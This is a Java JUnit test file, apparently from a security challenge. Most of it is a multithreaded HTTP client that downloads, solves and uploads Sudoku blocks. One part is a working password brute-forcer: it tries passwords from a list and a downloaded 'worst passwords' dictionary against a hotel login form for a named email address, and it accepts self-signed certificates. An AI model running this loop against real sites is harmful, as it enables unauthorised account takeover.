package net;

import file.FileUtil;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
import org.apache.http.conn.ssl.TrustSelfSignedStrategy;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.ssl.SSLContextBuilder;
import org.apache.http.util.EntityUtils;
import org.junit.Test;

import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.security.KeyManagementException;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.List;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

import static org.junit.Assert.assertEquals;

public class HttpUtilTest {
  HttpUtil httpUtil = new HttpUtil();

  String sudokuId = "";

  private static final ExecutorService threadpool = Executors.newFixedThreadPool(18);

  @Test
  public void solveSvetoku() throws ExecutionException, InterruptedException {
    sudokuId = httpUtil.sendRequest("http://svetoku.xsec.sap.corp:8888/api/svetoku/puzzles/", "Post", new HashMap<>(),
        new HashMap<>(), HttpUtil.PARAMETER_TYPE_URLENCODED);
    sudokuId = sudokuId.substring(1, sudokuId.length() - 1);
    char[][] board = new char[9][9];
    for (int i = 0; i < 9; i++) {
      for (int j = 0; j < 9; j++) {
        board[i][j] = '.';
      }
    }
    System.out.println("1:" + System.currentTimeMillis());
    SudokuGetter getter00 = new SudokuGetter(sudokuId, 0, 0, board);
    SudokuGetter getter01 = new SudokuGetter(sudokuId, 0, 1, board);
    SudokuGetter getter02 = new SudokuGetter(sudokuId, 0, 2, board);
    SudokuGetter getter10 = new SudokuGetter(sudokuId, 1, 0, board);
    SudokuGetter getter11 = new SudokuGetter(sudokuId, 1, 1, board);
    SudokuGetter getter12 = new SudokuGetter(sudokuId, 1, 2, board);
    SudokuGetter getter20 = new SudokuGetter(sudokuId, 2, 0, board);
    SudokuGetter getter21 = new SudokuGetter(sudokuId, 2, 1, board);
    SudokuGetter getter22 = new SudokuGetter(sudokuId, 2, 2, board);
    Future<String> future00 = threadpool.submit(getter00);
    Future<String> future01 = threadpool.submit(getter01);
    Future<String> future02 = threadpool.submit(getter02);
    Future<String> future10 = threadpool.submit(getter10);
    Future<String> future11 = threadpool.submit(getter11);
    Future<String> future12 = threadpool.submit(getter12);
    Future<String> future20 = threadpool.submit(getter20);
    Future<String> future21 = threadpool.submit(getter21);
    Future<String> future22 = threadpool.submit(getter22);
    //        while (!future10.isDone()||!future02.isDone()||!future01.isDone()||!future00.isDone()) {
    ////            System.out.println("Task is not completed yet....");
    //            try {
    //                Thread.sleep(1); //sleep for 1 millisecond before checking again
    //            } catch (InterruptedException e) {
    //                e.printStackTrace();
    //            }
    //        }
    String block00 = future00.get();
    //        System.out.println(block00);
    String block01 = future01.get();
    String block02 = future02.get();
    String block10 = future10.get();
    String block11 = future11.get();
    String block12 = future12.get();
    String block20 = future20.get();
    String block21 = future21.get();
    String block22 = future22.get();
    board = genBoard(0, 0, block00, board);
    board = genBoard(0, 1, block01, board);
    board = genBoard(0, 2, block02, board);
    board = genBoard(1, 0, block10, board);
    board = genBoard(1, 1, block11, board);
    board = genBoard(1, 2, block12, board);
    board = genBoard(2, 0, block20, board);
    board = genBoard(2, 1, block21, board);
    board = genBoard(2, 2, block22, board);

    //        board = getBlock(0, 0, board);
    //        board = getBlock(0, 1, board);
    //        board = getBlock(0, 2, board);
    //        board = getBlock(1, 0, board);
    //        board = getBlock(1, 1, board);
    //        board = getBlock(1, 2, board);
    //        board = getBlock(2, 0, board);
    //        board = getBlock(2, 1, board);
    //        board = getBlock(2, 2, board);
    Sudoku s = new Sudoku();
    System.out.println("solveStart" + System.currentTimeMillis());
    //        s.getAllSudokuSolutions(board);
    s.solveSudoku(board);
    System.out.println("solveEnd" + System.currentTimeMillis());
    String result00 = getBlockResult(0, 0, board);
    String result01 = getBlockResult(0, 1, board);
    String result02 = getBlockResult(0, 2, board);
    String result10 = getBlockResult(1, 0, board);
    String result11 = getBlockResult(1, 1, board);
    String result12 = getBlockResult(1, 2, board);
    String result20 = getBlockResult(2, 0, board);
    String result21 = getBlockResult(2, 1, board);
    String result22 = getBlockResult(2, 2, board);
    SudokuPutter putter00 = new SudokuPutter(sudokuId, 0, 0, result00);
    SudokuPutter putter01 = new SudokuPutter(sudokuId, 0, 1, result01);
    SudokuPutter putter02 = new SudokuPutter(sudokuId, 0, 2, result02);
    SudokuPutter putter10 = new SudokuPutter(sudokuId, 1, 0, result10);
    SudokuPutter putter11 = new SudokuPutter(sudokuId, 1, 1, result11);
    SudokuPutter putter12 = new SudokuPutter(sudokuId, 1, 2, result12);
    SudokuPutter putter20 = new SudokuPutter(sudokuId, 2, 0, result20);
    SudokuPutter putter21 = new SudokuPutter(sudokuId, 2, 1, result21);
    SudokuPutter putter22 = new SudokuPutter(sudokuId, 2, 2, result22);
    Future<String> fp00 = threadpool.submit(putter00);
    Future<String> fp01 = threadpool.submit(putter01);
    Future<String> fp02 = threadpool.submit(putter02);
    Future<String> fp10 = threadpool.submit(putter10);
    Future<String> fp11 = threadpool.submit(putter11);
    Future<String> fp12 = threadpool.submit(putter12);
    Future<String> fp20 = threadpool.submit(putter20);
    Future<String> fp21 = threadpool.submit(putter21);
    Future<String> fp22 = threadpool.submit(putter22);
    fp00.get();
    fp01.get();
    fp02.get();
    fp10.get();
    fp11.get();
    fp12.get();
    fp20.get();
    fp21.get();
    fp22.get();

  }

  private String getBlockResult(int row, int col, char[][] board) {
    StringBuilder builder = new StringBuilder("[[");
    int row3 = row * 3;
    int col3 = col * 3;
    builder.append(board[0 + row3][0 + col3]);
    builder.append(',');
    builder.append(board[0 + row3][1 + col3]);
    builder.append(',');
    builder.append(board[0 + row3][2 + col3]);
    builder.append("],[");
    builder.append(board[1 + row3][0 + col3]);
    builder.append(',');
    builder.append(board[1 + row3][1 + col3]);
    builder.append(',');
    builder.append(board[1 + row3][2 + col3]);
    builder.append("],[");
    builder.append(board[2 + row3][0 + col3]);
    builder.append(',');
    builder.append(board[2 + row3][1 + col3]);
    builder.append(',');
    builder.append(board[2 + row3][2 + col3]);
    builder.append("]]");
    String result = new String(builder);
    return result;
  }

  private char[][] genBoard(int row, int col, String block, char[][] board) {
    char[] chars = block.toCharArray();
    int row3 = row * 3;
    int col3 = col * 3;
    char[][] newBoard = board;
    newBoard[0 + row3][0 + col3] = chars[2] == '0' ? '.' : chars[2];
    newBoard[0 + row3][1 + col3] = chars[4] == '0' ? '.' : chars[4];
    newBoard[0 + row3][2 + col3] = chars[6] == '0' ? '.' : chars[6];
    newBoard[1 + row3][0 + col3] = chars[10] == '0' ? '.' : chars[10];
    newBoard[1 + row3][1 + col3] = chars[12] == '0' ? '.' : chars[12];
    newBoard[1 + row3][2 + col3] = chars[14] == '0' ? '.' : chars[14];
    newBoard[2 + row3][0 + col3] = chars[18] == '0' ? '.' : chars[18];
    newBoard[2 + row3][1 + col3] = chars[20] == '0' ? '.' : chars[20];
    newBoard[2 + row3][2 + col3] = chars[22] == '0' ? '.' : chars[22];
    return newBoard;
  }

  private static class SudokuPutter implements Callable {
    private String sudokuId;

    private final int row;

    private final int col;

    private String result;

    public SudokuPutter(String sudokuId, int row, int col, String result) {
      this.sudokuId = sudokuId;
      this.row = row;
      this.col = col;
      this.result = result;
    }

    @Override
    public String call() {
      putBlock(row, col, result);
      return null;
    }

    private String putBlock(int row, int col, String result) {
      HttpUtil httpUtil = new HttpUtil();

      System.out.println(result);
      try {
        String res = httpUtil.sendJsonRequest(
            "http://svetoku.xsec.sap.corp:8888/api/svetoku/puzzles/" + sudokuId + "/blocks/" + row + "/" + col, "Put",
            result);
        System.out.println(res);
        System.out.println(System.currentTimeMillis());
        return res;
      } catch (IOException e) {
        e.printStackTrace();
        return "";
      }
    }

  }

  private static class SudokuGetter implements Callable {
    private String sudokuId;

    private final int row;

    private final int col;

    private char[][] board;

    public SudokuGetter(String sudokuId, int row, int col, char[][] board) {
      this.sudokuId = sudokuId;
      this.row = row;
      this.col = col;
      this.board = board;
    }

    @Override
    public String call() {
      return getBlock(sudokuId, row, col, board);
    }

    private String getBlock(String sudokuId, int row, int col, char[][] board) {
      HttpUtil httpUtil = new HttpUtil();
      String block = httpUtil.sendRequest(
          "http://svetoku.xsec.sap.corp:8888/api/svetoku/puzzles/" + sudokuId + "/blocks/" + row + "/" + col, "Get",
          new HashMap<>(), new HashMap<>(), HttpUtil.PARAMETER_TYPE_URLENCODED);
      System.out.println(row + ", " + col + ":" + System.currentTimeMillis());
      return block;
    }

  }

  @Test
  public void checkWebPassword() {
    List<String> passwords = FileUtil.readTxtFileIntoStringArrList("test1.txt");
    for (String password : passwords) {
      try {
        //if (!HttpUtil.sendLoginInfo(password)) {
        //    System.out.println("found!" + password);
        if (!sendLoginInfo(password)) {
          System.out.println("found! " + password);
          break;
        }
        System.out.println(password + " wrong");
      } catch (Exception e) {
        System.out.println(password + " wrong");
      }
    }
  }

  @Test
  public void readDict() {
    HttpUtil httpUtil = new HttpUtil();
    String url = "https://raw.githubusercontent.com/shawntns/top-100-worst-passwords/master/dic.txt";
    String s = httpUtil.sendRequest(url, "Get", new HashMap(), new HashMap(), HttpUtil.PARAMETER_TYPE_URLENCODED);
    System.out.println(s);
  }

  private static Boolean sendLoginInfo(String password) throws KeyManagementException, NoSuchAlgorithmException {
    HttpPost post = new HttpPost("https://hotel.example.com/");
    String bodyStr = "email=lnorris%40bonvoyage.com&password=" + password;
    StringEntity bodyEntity = new StringEntity(bodyStr, ContentType.APPLICATION_FORM_URLENCODED);
    post.setEntity(bodyEntity);
    long startTime = System.currentTimeMillis();
    SSLContextBuilder builder = new SSLContextBuilder();
    try {
      builder.loadTrustMaterial(null, new TrustSelfSignedStrategy());
    } catch (NoSuchAlgorithmException e) {
      e.printStackTrace();
    } catch (KeyStoreException e) {
      e.printStackTrace();
    }
    SSLConnectionSocketFactory sslsf = new SSLConnectionSocketFactory(builder.build());

    try (CloseableHttpClient httpClient = HttpClients.custom().setSSLSocketFactory(sslsf).build();
        //HttpClients.createDefault();
        CloseableHttpResponse response = httpClient.execute(post)) {
      System.out.println("executionTime:" + (System.currentTimeMillis() - startTime) + "ms");
      String responseStr = EntityUtils.toString(response.getEntity());
      return responseStr.contains("Invalid credentials");
    } catch (ClientProtocolException e) {
      e.printStackTrace();
    } catch (IOException e) {
      e.printStackTrace();
    }
    System.out.println("Exception when checking password:" + password);
    return null;
  }

  @Test
  public void givenUrl_whenGetsDefaultPort_thenCorrect() throws URISyntaxException, MalformedURLException {
    URL url = new URI(
        "/rest/workforce/v1/valueLists?entity=globalDetail&property=genericString4&country={countryCode}&$at={startDate}&id={id}{&$top,$skip,$search}").toURL();
    assertEquals(-1, url.getPort());
    assertEquals(80, url.getDefaultPort());
  }
}